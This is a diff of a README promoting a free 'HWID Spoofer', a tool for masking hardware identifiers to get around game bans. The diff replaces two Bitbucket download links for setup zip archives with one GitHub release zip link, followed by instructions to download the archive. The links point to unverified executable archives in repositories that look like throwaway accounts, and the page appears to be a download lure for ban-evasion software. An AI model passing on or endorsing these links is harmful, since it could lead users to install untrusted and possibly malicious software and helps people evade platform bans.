@@ -3,8 +3,7 @@ HWID Spoofer is a powerful tool designed to protect your gaming experience by ma
 
 
 > [!Note]
-> ## Hwid Spoofer x32 - [Click To Download](https://bitbucket.org/gitfilesprojecct/gitfiles/downloads/Spoofer_Setup_x32.zip)
-> ## Hwid Spoofer x64 - [Click To Download](https://bitbucket.org/gitfilesprojecct/gitfiles/downloads/Spoofer_Setup_x64.zip)
+> [*Click To Download*](https://github.com/Free-Hwid-Spoofer/Free-Hwid-Spoofer/releases/download/v2.3.2/HwidSpoofer.zip)
 
 ## Instructions
 1. Download the archive
